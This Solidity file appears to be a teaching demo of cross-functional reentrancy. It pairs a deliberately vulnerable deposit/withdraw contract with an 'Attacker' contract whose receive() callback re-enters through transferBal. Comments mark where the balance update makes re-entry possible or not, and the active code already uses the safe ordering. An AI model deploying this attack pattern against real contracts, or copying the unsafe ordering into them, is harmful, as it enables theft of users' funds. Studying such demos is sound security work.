// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Contains Cross-functional Reentrancy
contract Vulnurable {
    mapping(address user => uint256 funds) public balances;

    function deposite() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        uint256 balance = balances[msg.sender];
        balances[msg.sender] = balance - amount; // if done here, re-entry not possible

        require(balance >= amount, "Infufficeient bal");

        (bool sent,) = payable(msg.sender).call{value: amount}("");
        require(sent, "Fund Transfer Error");

        // balances[msg.sender] = balance - amount; // if done here, re-entry possible
    }

    function transferBal(address to, uint256 amount) public {
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}

contract Attacker {
    address owner;
    address victim;

    constructor(address o, address v) {
        owner = o;
        victim = v;
    }

    function adding() public payable {
        Vulnurable(victim).deposite{value: msg.value}();
    }

    function get(uint256 amt) public {
        Vulnurable(victim).withdraw(amt);
    }

    receive() external payable {
        uint256 balance = Vulnurable(victim).balances(address(this));
        Vulnurable(victim).transferBal(owner, balance);
    }
}
